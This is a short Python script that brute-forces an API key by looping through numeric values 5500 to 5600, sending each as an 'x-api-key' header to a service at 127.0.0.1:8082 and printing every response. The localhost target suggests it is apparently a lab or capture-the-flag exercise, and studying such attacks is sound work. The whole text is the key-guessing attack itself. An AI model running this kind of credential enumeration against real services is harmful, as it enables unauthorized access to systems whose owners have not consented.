url = "http://127.0.0.1:8082"
startingKey = 5500
endingKey = 5600
hdr = {}

while startingKey <= endingKey:
  import urllib.request, urllib.error, urllib.parse
  hdr = { 'x-api-key' : str(startingKey) }
  req = urllib.request.Request(url, headers=hdr)
  response = urllib.request.urlopen(req)
  startingKey = startingKey + 1
  html = response.read()
  print(html)
